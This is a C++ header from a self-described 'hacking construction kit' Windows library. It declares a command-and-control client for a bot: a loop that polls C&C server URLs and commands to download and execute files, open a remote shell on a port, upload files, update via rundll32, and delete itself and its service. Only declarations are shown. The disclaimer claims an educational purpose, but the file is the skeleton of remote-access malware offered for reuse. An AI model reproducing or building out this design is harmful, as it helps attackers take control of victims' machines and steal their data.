/*
 * Hacking construction kit -- A GPL Windows security library.
 * While this library can potentially be used for nefarious purposes, 
 * it was written for educational and recreational
 * purposes only and the author does not endorse illegal use.
 *
 * This library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 *
 * You should have received a copy of the GNU General Public License
 * along with this library.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Author: thirdstormofcythraul@outlook.com
 */
#pragma once

#include <string>
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#include "service.h"
#include "tstring.h"

// This struct will be passed to connectToCCLoop
struct CCLoop_t {
	// current module file name
	const wchar_t *filename;
	// version is used for the call to c&c
	const wchar_t *version;
	// wait time between two call to c&c in seconds
	int wait;
	// array of servers url
	std::string *serversUrl;
	// nb of servers in the array
	int nbServers;
};

// manage commands from C&C
class CommandManager {
public:
	// currentName: current module file name
	CommandManager():m_lastcommand(0){}
	
	// start to connect to c&c
	// call this function in a thread to start connection
	// params must be a CCLoop_t
	static DWORD WINAPI connectToCCLoop(LPVOID params);

private:
	int m_lastcommand;

	// execute an array of commands
	bool executeCommands(LPSTR *commands);
	bool isNumeric(LPSTR str);
	// stop (set Global::SERVICE_RUNNING_EVENT)
	bool stop();
	// download from uri to filename
	bool download(const wchar_t *uri, const wchar_t *filename);

	bool isToken(int &index, LPSTR *commands);
	// stop and delete this file
	bool kill();
	// open a remote shell in a thread
	void openShellInNewThread(int port);
	// delete this file
	void deleteCurrent();
	// remove the service
	bool removeService();
	// execute this file with this arguments
	bool execute(const wchar_t *filename, const wchar_t *arguments);
	// download from uri to filename, and execute this file with arguements
	bool downloadAndExecute(const wchar_t *uri, const wchar_t *filename, const wchar_t *arguments);
	// download a dll from uri, and call rundll32.exe dllfile InstallService
	bool update(const wchar_t *uri, const wchar_t *filename);

	bool uploadFile(std::wstring uri, std::wstring localname, std::wstring remotename);

	bool plug(const wchar_t *uri, const wchar_t *filename);

	std::wstring getNextToken(int &index, LPSTR *commands);

};
